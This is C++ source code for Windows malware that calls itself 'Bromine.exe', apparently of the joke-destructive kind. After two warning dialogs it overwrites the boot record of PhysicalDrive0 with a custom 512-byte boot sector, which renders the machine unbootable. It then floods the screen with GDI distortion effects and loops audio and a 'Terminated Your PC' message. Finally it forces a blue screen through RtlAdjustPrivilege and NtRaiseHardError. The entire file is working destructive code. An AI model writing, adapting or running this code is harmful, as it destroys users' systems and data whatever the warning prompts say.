#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
    ShowWindow(hWnd, 5);
    return 1;
}

const unsigned char MasterBootRecord[] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBE, 0xC1, 0x7D, 
0xBF, 0x20, 0x14, 0x2E, 0xAD, 0x91, 0xBB, 0xF0, 0x00, 0xD1, 0xE1, 0xB8, 0x18, 0x37, 0x73, 0x03, 
0xB8, 0x38, 0x02, 0xE8, 0x22, 0x00, 0x01, 0xDF, 0x83, 0xEB, 0x10, 0x72, 0x4F, 0xE8, 0x18, 0x00, 
0x29, 0xDF, 0x83, 0xEF, 0x08, 0xEB, 0xE2, 0xAD, 0x97, 0xAD, 0x84, 0xE4, 0x93, 0xB0, 0x30, 0x50, 
0xC6, 0x44, 0xFF, 0x02, 0xE8, 0xAE, 0x00, 0x58, 0x50, 0x53, 0x51, 0x57, 0x50, 0xBB, 0x79, 0x7D, 
0x2E, 0xD7, 0x93, 0xB9, 0x08, 0x00, 0x88, 0xF8, 0xD0, 0xE3, 0x72, 0x02, 0x31, 0xC0, 0x80, 0xFF, 
0x10, 0x72, 0x07, 0x80, 0x3D, 0x0E, 0x74, 0x98, 0x32, 0x05, 0xAA, 0xE2, 0xE9, 0x81, 0xC7, 0x38, 
0x01, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xD5, 0x5F, 0x59, 0x5B, 0x58, 0xC3, 0x81, 0xC7, 0x88, 0x09, 
0x81, 0xFE, 0xEB, 0x7D, 0x75, 0x8D, 0xB1, 0x05, 0xB8, 0x02, 0x00, 0x2E, 0xA5, 0xAB, 0xE2, 0xFB, 
0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x04, 0xFA, 0x74, 0xF6, 0x89, 0x16, 0x04, 0xFA, 0xB4, 0x01, 
0xCD, 0x16, 0xB4, 0x00, 0x74, 0x02, 0xCD, 0x16, 0x88, 0xE0, 0x3C, 0x01, 0x75, 0x02, 0xCD, 0x20, 
0x2C, 0x48, 0x72, 0x0C, 0x3C, 0x09, 0x73, 0x08, 0xBB, 0xF5, 0x7D, 0x2E, 0xD7, 0xA2, 0xFE, 0xF9, 
0xBE, 0x20, 0xE6, 0xAD, 0x97, 0xAD, 0x93, 0x31, 0xC0, 0xE8, 0x2B, 0x00, 0x80, 0x36, 0xFF, 0xF9, 
0x80, 0xB8, 0x28, 0x0E, 0x78, 0x07, 0xA0, 0x22, 0xE6, 0xB1, 0x03, 0xD2, 0xE0, 0xE8, 0x68, 0xFF, 
0xBD, 0x37, 0x7C, 0xB7, 0x21, 0xFF, 0xD5, 0xB7, 0x2E, 0xFF, 0xD5, 0xB7, 0x28, 0xFF, 0xD5, 0xB7, 
0x34, 0xFF, 0xD5, 0xEB, 0x9B, 0x74, 0x03, 0xE8, 0x4E, 0xFF, 0x89, 0xF8, 0x31, 0xD2, 0xB9, 0x40, 
0x01, 0xF7, 0xF1, 0x88, 0xD4, 0x08, 0xC4, 0x80, 0xE4, 0x07, 0x75, 0x5A, 0xB5, 0x37, 0x38, 0x6D, 
0xFF, 0x10, 0xE4, 0x38, 0xAD, 0x00, 0x0A, 0x10, 0xE4, 0x38, 0x6D, 0x08, 0x10, 0xE4, 0x38, 0xAD, 
0xC0, 0xFE, 0x10, 0xE4, 0x84, 0xFF, 0x74, 0x2B, 0xF6, 0xC3, 0x05, 0x74, 0x0C, 0x3B, 0x16, 0x00, 
0xFA, 0xB0, 0x02, 0x72, 0x0C, 0xB0, 0x08, 0xEB, 0x08, 0x3C, 0x00, 0xB0, 0x04, 0x72, 0x02, 0xB0, 
0x01, 0x84, 0xC4, 0x75, 0x23, 0x88, 0xD8, 0x84, 0xC4, 0x75, 0x1D, 0xD0, 0xE8, 0x75, 0xF8, 0xB0, 
0x08, 0xEB, 0xF4, 0x89, 0x16, 0x00, 0xFA, 0x2E, 0xA2, 0x3A, 0x7D, 0xA0, 0xFE, 0xF9, 0x84, 0xC4, 
0x75, 0x06, 0x20, 0xDC, 0x74, 0x1A, 0x88, 0xD8, 0x88, 0x44, 0xFE, 0xA8, 0x05, 0xBB, 0x80, 0xFD, 
0x75, 0x03, 0xBB, 0x02, 0x00, 0xA8, 0x0C, 0x74, 0x02, 0xF7, 0xDB, 0x01, 0xDF, 0x89, 0x7C, 0xFC, 
0xC3, 0x00, 0x42, 0xE7, 0xE7, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xFC, 0xF0, 0xF0, 0xFC, 0x7E, 
0x3C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x7E, 0xFF, 0xFF, 0xE7, 0xE7, 0x42, 
0x00, 0x3C, 0x7E, 0xFF, 0xFF, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xDB, 0xDB, 0xFF, 0xFF, 0xFF, 
0xA5, 0x00, 0x00, 0x00, 0x18, 0x18, 0x00, 0x00, 0x00, 0x3C, 0x7E, 0x3F, 0x0F, 0x0F, 0x3F, 0x7E, 
0x3C, 0x00, 0x00, 0xFE, 0x7F, 0x02, 0x42, 0x02, 0x42, 0xFF, 0x7F, 0x40, 0x42, 0x7E, 0x7E, 0x02, 
0x02, 0x7F, 0x02, 0xC0, 0x03, 0x40, 0x02, 0x7F, 0x02, 0x40, 0x02, 0xFE, 0x7F, 0x02, 0x42, 0xFF, 
0x7B, 0x40, 0x0A, 0x7E, 0x7E, 0x02, 0x40, 0xFF, 0x7F, 0x00, 0x00, 0x98, 0xAA, 0x90, 0x50, 0x98, 
0x64, 0xA0, 0x3C, 0xA8, 0x50, 0x01, 0x00, 0x00, 0x08, 0x00, 0x02, 0x00, 0x00, 0x04, 0x55, 0xAA
};

void mbr()
{    
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t>>6|t>>12)&15&t>>9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>8&t)*t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 10) & 42) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 69) & 420) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 100) & 666) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI childwindows(LPVOID lpParam) {
   while (1) {
      EnumChildWindows(GetDesktopWindow(), EnumProc, 0);
      Sleep(1);
    }
}

DWORD WINAPI sines(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 20;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}

DWORD WINAPI RGB2(LPVOID lpParam)
{
    HWND v3; 
    HBITMAP h; 
    HDC hdcSrc; 
    HDC hdc; 
    void* lpvBits;
    int nHeight; 
    int nWidth; 
    DWORD v12; 
    int j; 
    int v14; 
    int i; 
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt1[10];
        int inc31 = rand() % w - rand() % h % rand() % w - rand() % h;
        inc31--;
        pt1[0].x = rect.left - inc31;
        pt1[0].y = rect.top - inc31;
        pt1[1].x = rect.right - inc31;
        pt1[1].y = rect.top + inc31;
        pt1[2].x = rect.left + inc31;
        pt1[2].y = rect.bottom - inc31;
        PlgBlt(hdc, pt1, hdc, rect.left, rect.top, rect.right, rect.bottom, 0, 0, 0);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
 
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
 
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(25);
        }
    }
}

DWORD WINAPI patblt(LPVOID lpParam)
{
    HDC hdc = 0;
    int sx = 0, sy = 0;
    int rx = 0, ry = 0;

    while (1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(SM_CXSCREEN);
        sy = GetSystemMetrics(SM_CYSCREEN);
        rx = rand() % sx;
        ry = rand() % sy;
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225)));
        PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
        Sleep(10);
    }
}

DWORD WINAPI bitblt(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(10);
    }
}

DWORD WINAPI textout(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Bromine.exe Terminated Your PC";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
    }
}

int main(){
	    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Bromine.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Bromine.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else{
        	mbr();
        	HANDLE thread1 = CreateThread(0, 0, childwindows, 0, 0, 0);
        	sound1();
        	Sleep(5000);
        	HANDLE thread2 = CreateThread(0, 0, sines, 0, 0, 0);
        	Sleep(25000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
        	HANDLE thread3 = CreateThread(0, 0, RGB2, 0, 0, 0);
        	sound2();
        	Sleep(30000);
        	TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound3();
        	Sleep(30000);
        	TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread5 = CreateThread(0, 0, wef, 0, 0, 0);
            sound4();
        	Sleep(30000);
        	TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread6 = CreateThread(0, 0, bitblt, 0, 0, 0);
            sound5();
        	Sleep(30000);
        	TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread7 = CreateThread(0, 0, patblt, 0, 0, 0);
            HANDLE thread8 = CreateThread(0, 0, textout, 0, 0, 0);
			PlaySoundW(L"last.wav", NULL, SND_LOOP | SND_ASYNC);
			Sleep(30000);
			//boolean
			BOOLEAN b;
			//bsod response
			unsigned long response;
			//process privilege
			RtlAdjustPrivilege(19, true, false, &b);
			//call bsod
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
        	Sleep(-1);
		}
	}
}
